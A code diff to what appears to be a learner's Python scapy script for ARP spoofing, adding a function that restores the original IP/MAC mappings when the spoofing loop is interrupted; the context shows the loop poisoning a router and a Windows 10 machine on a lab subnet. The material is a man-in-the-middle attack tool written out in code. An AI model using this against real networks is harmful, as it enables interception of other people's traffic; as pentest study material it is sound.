@@ -1,4 +1,6 @@
 """
+This is the same as    arpspoof2   but will restore the original IP/MAC addressess.
+
 Machines on a network can identify each other.
 Machine M asks for the MAC address of a certain IP address the N-machine
 Another network machine may know N's MAC address is with the target IP address, and may respond with it.
@@ -28,6 +30,13 @@ Details seen on:    OneNote --> Python Pentest --> arpspoof
 import scapy.all as scapy       # Had to install scapy on the machine also.
 
 
+def restore(destination_ip, source_ip):         # If MAC address has been spoofed, we can restore originals
+    target_mac = get_target_mac(destination_ip) # Ex. the address of the target router
+    source_mac = get_target_mac(source_ip)      # Ex. The address of the target Windows 10 machine
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
+
+
 def get_target_mac(target_ip):
     arp_request = scapy.ARP(pdst=target_ip)             # Our request, with a port destination of our final target.
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    # Broadcast packet with our request, to send to entire network.
@@ -51,6 +60,8 @@ def main():
             spoof_arp("10.0.2.15", "10.0.2.12")     # target = router
             spoof_arp("10.0.2.12", "10.0.2.15")     # target = windows 10 pc
     except KeyboardInterrupt:
+        restore("10.0.2.15", "10.0.2.12")
+        restore("10.0.2.12", "10.0.2.15")
         exit(0)
 
 
